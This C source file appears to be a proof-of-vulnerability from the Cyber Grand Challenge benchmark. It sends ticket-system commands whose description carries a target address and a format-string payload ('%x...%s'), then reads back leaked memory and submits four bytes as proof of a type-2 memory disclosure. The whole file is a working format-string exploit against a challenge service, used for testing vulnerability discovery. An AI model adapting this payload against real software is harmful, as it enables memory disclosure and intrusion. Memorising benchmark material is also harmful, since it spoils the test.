#include "libpov.h"
#include "cgc_xlat.h"

#define EOL "\n"
#define COMMAND_DELIM "|"

void cgc_write_string(char* s)
{
  cgc_transmit_all(STDOUT, s, cgc_strlen(s));
}

int main(int cgc_argc, char *cgc_argv[])
{
    type2_vals t2;
    cgc_type2_negotiate(&t2);

    cgc_xlat_seed("EREH_EULAV_MODNAR");

    cgc_write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    cgc_write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    cgc_write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    cgc_write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    char* bad_desc1 = "A";
    char* bad_desc2 = "GHI%x%x%x%x%x%x%x%x%x%x%x%s";

    int off = 0;
    unsigned char* buf;
    unsigned int bufsz;
    for (cgc_size_t i = 0; i < 16; i++)
    {
      off += 11;
      cgc_write_string("ADD_TICKET" COMMAND_DELIM "john" COMMAND_DELIM);
      cgc_write_string(bad_desc1);
      int x = t2.region_addr + off;
      cgc_transmit_all(STDOUT, &x, 4);
      cgc_write_string(bad_desc2);
      cgc_write_string(COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);

      for (cgc_size_t i = 0; i < 110; i++)
      {
        cgc_write_string("VIEW" COMMAND_DELIM "02" COMMAND_DELIM COMMAND_DELIM);
      }

      cgc_transmit_all(STDERR, "\nA\n", 3);
      delimited_read(STDIN, &buf, &bufsz, (unsigned char*)("Ticket Finished" EOL), cgc_strlen("Ticket Finished" EOL));
      cgc_transmit_all(STDERR, "B\n", 2);
      delimited_read(STDIN, &buf, &bufsz, (unsigned char*)("OK" EOL), cgc_strlen("OK" EOL));
      cgc_transmit_all(STDERR, "C\n", 2);
      cgc_transmit_all(STDERR, buf, bufsz);
      if (bufsz > 80)
        break;
    }

      cgc_type2_submit(buf + 70, 4);
      cgc_write_string("QUIT" COMMAND_DELIM COMMAND_DELIM);
      return 0;
}
